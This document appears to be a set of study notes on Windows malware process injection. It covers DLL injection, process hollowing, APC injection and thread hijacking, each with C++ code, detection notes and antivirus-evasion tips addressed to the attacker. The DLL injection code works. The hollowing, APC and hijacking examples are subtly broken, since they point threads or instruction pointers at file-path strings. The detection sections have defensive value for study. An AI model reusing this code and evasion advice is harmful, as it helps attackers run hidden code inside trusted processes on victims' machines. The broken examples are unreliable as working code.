# Index 
- [[3. Common Malware Techniques]]
	- [[3.1 Process Injection Techniques]]
	- [[3.2 Persistence Mechanisms]]
	- [[3.3 Hooking Windows APIs]]
	- [[3.4 Packing & Encryption]]

# DLL Injection

#### How it Works
DLL injection involves loading a Dynamic Link Library (DLL) into the memory space of another process. This is done to force a target process to execute code inside the injected DLL. 

This method is popular because DLLs are legitimate Windows objects, and executing DLL code within the context of a trusted process makes it harder for AV solutions to detect the malicious behavior.

#### Basic Example of DLL Injection
Here’s a basic implementation of DLL injection using the `CreateRemoteThread` and `LoadLibrary` functions in C++.

```cpp
#include <windows.h>
#include <iostream>

int InjectDLL(DWORD processId, const char* dllPath) {
    // Step 1: Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        std::cerr << "Failed to open target process." << std::endl;
        return -1;
    }

    // Step 2: Allocate memory in the target process for the DLL path
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (!pRemoteMemory) {
        std::cerr << "Failed to allocate memory in target process." << std::endl;
        CloseHandle(hProcess);
        return -1;
    }

    // Step 3: Write the DLL path into the allocated memory in the target process
    WriteProcessMemory(hProcess, pRemoteMemory, dllPath, strlen(dllPath) + 1, NULL);

    // Step 4: Get the address of LoadLibraryA from kernel32.dll
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPVOID pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");

    // Step 5: Create a remote thread in the target process that calls LoadLibraryA with the DLL path
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteMemory, 0, NULL);
    if (!hThread) {
        std::cerr << "Failed to create remote thread in target process." << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    // Wait for the remote thread to complete
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}

int main() {
    DWORD targetProcessId = 1234;  // Replace with the target process ID
    const char* dllPath = "C:\\path\\to\\malicious.dll";  // Replace with the full path to your DLL

    if (InjectDLL(targetProcessId, dllPath) == 0) {
        std::cout << "DLL injection successful!" << std::endl;
    } else {
        std::cerr << "DLL injection failed!" << std::endl;
    }

    return 0;
}
```

#### Detection Mechanisms
Antivirus solutions monitor for calls to functions like `CreateRemoteThread`, `VirtualAllocEx`, and `WriteProcessMemory`, as these are often used in process injection. 

#### Evasion Techniques
- Manual Mapping: Instead of using `LoadLibrary`, which is easily detected, you can manually map the DLL into memory and resolve the imports yourself.
- In-Memory Injection: Don’t write the DLL to disk. Instead, load the DLL directly into memory and execute it from there, making it harder for AVs to detect.
- Custom Stub: Avoid using `CreateRemoteThread`. Instead, use techniques like NtCreateThreadEx, which are less commonly monitored by AVs.

# Process Hollowing

#### How it Works
Process hollowing involves creating a new legitimate process in a suspended state, replacing its memory (the code section) with malicious code, and then resuming the process. The new process appears legitimate to the operating system but is executing malicious code.

This technique is often used by malware to execute under the guise of a trusted process, making it harder for security tools to detect its malicious activity.

#### Basic Example of Process Hollowing
```cpp
#include <windows.h>
#include <iostream>

int HollowProcess(const char* targetProcessPath, const char* maliciousPayloadPath) {
    STARTUPINFO startupInfo = {0};
    PROCESS_INFORMATION processInfo = {0};
    startupInfo.cb = sizeof(startupInfo);

    // Step 1: Start a new process in suspended state
    if (!CreateProcess(targetProcessPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInfo)) {
        std::cerr << "Failed to create process." << std::endl;
        return -1;
    }

    // Step 2: Get the address of the process's base image (PE file)
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    GetThreadContext(processInfo.hThread, &context);

    // Step 3: Replace the process image with the malicious payload
    LPVOID remoteMemory = VirtualAllocEx(processInfo.hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(processInfo.hProcess, remoteMemory, maliciousPayloadPath, strlen(maliciousPayloadPath) + 1, NULL);

    // Step 4: Update the EIP (instruction pointer) to point to the new payload
    context.Eip = (DWORD)remoteMemory;
    SetThreadContext(processInfo.hThread, &context);

    // Step 5: Resume the process
    ResumeThread(processInfo.hThread);

    // Cleanup
    CloseHandle(processInfo.hThread);
    CloseHandle(processInfo.hProcess);

    return 0;
}

int main() {
    const char* targetProcess = "C:\\Windows\\System32\\notepad.exe";  // Legitimate process to hollow
    const char* payload = "C:\\path\\to\\malicious_payload.exe";  // Malicious payload

    if (HollowProcess(targetProcess, payload) == 0) {
        std::cout << "Process hollowing successful!" << std::endl;
    } else {
        std::cerr << "Process hollowing failed!" << std::endl;
    }

    return 0;
}
```

#### Detection Mechanisms
Security software can detect process hollowing by monitoring for processes that change their memory contents after being started. Additionally, unusual behavior, such as loading an executable file that doesn’t match the process name, can raise flags.

#### Evasion Techniques
- Delayed Execution: Introduce time delays or use specific triggers (like certain files being opened) to delay the malicious code execution.
- Code Polymorphism: Modify the malicious payload each time it is executed to prevent pattern-based detection.
- Handle Hiding: Close handles or use low-level API calls (like `NtUnmapViewOfSection`) to reduce visibility of the manipulation.

# APC (Asynchronous Procedure Call) Injection

#### How it Works
APC injection involves queuing malicious code to be executed in the context of a target process when that process enters an alertable state. This method relies on using `QueueUserAPC` to inject the payload into an existing thread.

#### Basic Example of APC Injection
```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

int InjectAPC(DWORD processId, const char* payload) {
    // Step 1: Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        std::cerr << "Failed to open process." << std::endl;
        return -1;
    }

    // Step 2: Get a handle to the target thread
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)payload, NULL, 0, NULL);
    if (!hThread) {
        std::cerr << "Failed to create thread." << std::endl;
        CloseHandle(hProcess);
        return -1;
    }

    // Step 3: Queue an APC to the target thread
    if (QueueUserAPC((PAPCFUNC)payload, hThread, NULL) == 0) {
        std::cerr << "Failed to queue APC." << std::endl;
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return -1;
    }

    std::cout << "APC injection successful!" << std::endl;

    // Cleanup
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}

int main() {
    DWORD processId = 1234;

  // Target process ID
    const char* payload = "C:\\path\\to\\malicious_payload.exe";  // Malicious payload

    InjectAPC(processId, payload);
    return 0;
}
```

#### Detection Mechanisms
Since APCs are intended for legitimate use, monitoring all queued APCs would produce too many false positives. However, security software can monitor when APCs are used to inject code into unrelated processes or trigger unusual activity.

#### Evasion Techniques
- Use Thread Hijacking: After queuing an APC, hijack the thread to prevent the malicious payload from being visible in memory.
- Hide in Legitimate Threads: Queue your APC to threads within legitimate Windows processes, such as system services, to reduce suspicion.

# Thread Hijacking

#### How it Works
Thread hijacking involves suspending a thread within a target process, modifying its execution context (registers, stack, etc.) to point to malicious code, and resuming the thread. This makes it harder for AV solutions to detect the malicious code, as it is executed by an already running thread.

#### Basic Example of Thread Hijacking
```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

int HijackThread(DWORD threadId, const char* maliciousCode) {
    // Step 1: Open the target thread
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);
    if (!hThread) {
        std::cerr << "Failed to open thread." << std::endl;
        return -1;
    }

    // Step 2: Suspend the thread
    SuspendThread(hThread);

    // Step 3: Modify the thread's context to point to malicious code
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &context);

#ifdef _M_X64
    context.Rip = (DWORD_PTR)maliciousCode;  // On x64
#else
    context.Eip = (DWORD_PTR)maliciousCode;  // On x86
#endif

    SetThreadContext(hThread, &context);

    // Step 4: Resume the thread
    ResumeThread(hThread);

    std::cout << "Thread hijacking successful!" << std::endl;

    // Cleanup
    CloseHandle(hThread);

    return 0;
}

int main() {
    DWORD threadId = 1234;  // Replace with the target thread ID
    const char* maliciousCode = "C:\\path\\to\\malicious_code";  // Path to your malicious code

    HijackThread(threadId, maliciousCode);
    return 0;
}
```

#### Detection Mechanisms
Security solutions can detect thread hijacking by monitoring for suspended threads and changes in thread context. Anomalous changes to `EIP`/`RIP` can indicate thread hijacking.

#### Evasion Techniques
- Suspend Multiple Threads: To make detection harder, suspend multiple threads and resume them in a random order.
- Hide Execution: Use techniques such as `NtSetContextThread` and `NtQueueApcThread` to modify thread contexts and execute code more stealthily.